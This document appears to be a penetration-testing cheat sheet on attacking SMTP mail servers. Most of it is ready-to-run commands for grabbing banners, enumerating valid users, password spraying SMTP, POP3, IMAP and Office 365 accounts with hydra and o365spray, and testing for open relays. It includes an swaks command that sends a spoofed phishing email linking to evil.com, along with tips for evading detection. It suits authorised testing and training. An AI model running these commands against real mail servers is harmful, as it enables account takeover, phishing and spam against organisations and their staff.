# SMTP Enumeration (Ports 25, 465, 587)

Enumerate SMTP servers to identify mail providers, valid users, and potential open relay misconfigurations.
SMTP user enumeration can provide valid usernames for password spraying attacks against mail services.

## Quick Reference

```bash
# Banner grabbing
nc -nv 10.10.10.10 25

# User enumeration with smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10

# Check for open relay
nmap -p 25 --script smtp-open-relay 10.10.10.10
```

## SMTP Ports

- **Port 25**: SMTP (unencrypted)
- **Port 465**: SMTPS (SMTP over SSL)
- **Port 587**: SMTP with STARTTLS

## Identify Mail Provider

```bash
# Check MX records
host -t MX domain.com
dig mx domain.com | grep "MX" | grep -v ";"

# Check A record for mail server
host -t A mail1.domain.com
```

## Banner Grabbing

```bash
# Using netcat
nc -nv 10.10.10.10 25

# Using telnet
telnet 10.10.10.10 25

# Using Nmap
nmap -p 25 -sV 10.10.10.10
```

## User Enumeration

### Manual Enumeration

```bash
# Connect with telnet
telnet 10.10.10.10 25

# VRFY command
VRFY root
VRFY admin
VRFY user@domain.com

# EXPN command (expand mailing list)
EXPN all
EXPN support-team

# RCPT TO command
MAIL FROM:<test@test.com>
RCPT TO:<admin@domain.com>
```

### Automated Enumeration

```bash
# smtp-user-enum with VRFY
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10

# smtp-user-enum with EXPN
smtp-user-enum -M EXPN -U users.txt -t 10.10.10.10

# smtp-user-enum with RCPT
smtp-user-enum -M RCPT -U users.txt -D domain.com -t 10.10.10.10

# With threading
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10 -w 20 -v
```

## Nmap NSE Scripts

```bash
# SMTP enumeration
nmap -p 25 --script smtp-commands,smtp-enum-users 10.10.10.10

# Check for open relay
nmap -p 25 --script smtp-open-relay 10.10.10.10

# NTLM information disclosure
nmap -p 25 --script smtp-ntlm-info 10.10.10.10

# All SMTP scripts
nmap -p 25 --script "smtp-*" 10.10.10.10
```

## Password Spraying

```bash
# Hydra against SMTP
hydra -L users.txt -p 'Password123!' smtp://10.10.10.10

# Against POP3 (often same credentials)
hydra -L users.txt -p 'Password123!' pop3://10.10.10.10

# Against IMAP
hydra -L users.txt -p 'Password123!' imap://10.10.10.10
```

## Office 365 Enumeration

```bash
# Validate domain uses O365
python3 o365spray.py --validate --domain company.com

# Enumerate users
python3 o365spray.py --enum -U users.txt --domain company.com

# Password spray
python3 o365spray.py --spray -U users.txt -p 'Password123!' --count 1 --lockout 1 --domain company.com
```

## Open Relay Testing

```bash
# Check with Nmap
nmap -p 25 --script smtp-open-relay 10.10.10.10

# Manual test with telnet
telnet 10.10.10.10 25
HELO test.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
This is a test email.
.
QUIT

# Send phishing email via open relay
swaks --from notifications@company.com --to employees@company.com --header 'Subject: Important' --body 'Click here: http://evil.com' --server 10.10.10.10
```

## Common Workflow

```bash
# Step 1: Identify mail provider
host -t MX company.com

# Step 2: If on-premise, scan SMTP ports
nmap -p 25,465,587 -sV -sC 10.10.10.10

# Step 3: Check which commands are enabled
telnet 10.10.10.10 25
VRFY root

# Step 4: Enumerate users
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10

# Step 5: Password spray
hydra -L found_users.txt -p 'Password123!' smtp://10.10.10.10

# Step 6: Check for open relay
nmap -p 25 --script smtp-open-relay 10.10.10.10
```

## Notes

**SMTP Commands:**

- **HELO/EHLO**: Identify client to server
- **MAIL FROM**: Specify sender
- **RCPT TO**: Specify recipient
- **DATA**: Begin message content
- **VRFY**: Verify user exists
- **EXPN**: Expand mailing list
- **HELP**: Show available commands
- **QUIT**: Close connection

**User Enumeration Methods:**

1. **VRFY**: Verifies if email address exists
   - Response 250: User exists
   - Response 550: User doesn't exist

2. **EXPN**: Expands mailing list/alias
   - Returns all members of a group

3. **RCPT TO**: Identifies valid recipients
   - Response 250: Valid recipient
   - Response 550: Invalid recipient

**Mail Provider Identification:**

Cloud providers:
- `aspmx.l.google.com` - Google Workspace
- `*.mail.protection.outlook.com` - Microsoft 365
- `mx.zoho.com` - Zoho Mail

On-premise indicators:
- MX record points to company domain
- Custom mail server hostname

**Open Relay:**

An SMTP server that allows anyone to send email through it without authentication. Can be abused for:
- Phishing campaigns
- Spam distribution
- Email spoofing

**Common Misconfigurations:**

- VRFY/EXPN/RCPT TO commands enabled
- No authentication required
- Open relay configuration
- Verbose error messages
- Default credentials

**Office 365 Specific:**

O365 uses modern authentication but older protocols (SMTP, POP3, IMAP) may still be enabled:
- Username format: `user@domain.com`
- Password spraying detection is in place
- Use `--count 1 --lockout 1` to avoid lockouts

**Best Practices:**

- Always check MX records first
- Enumerate users before password spraying
- Use small user lists to avoid detection
- Respect lockout policies
- Test for open relay (high-value finding)
- Check both encrypted and unencrypted ports
- Look for NTLM information disclosure

**Related Services:**

- POP3 (110, 995): Mail retrieval
- IMAP (143, 993): Mail retrieval with folder support
- Often use same credentials as SMTP
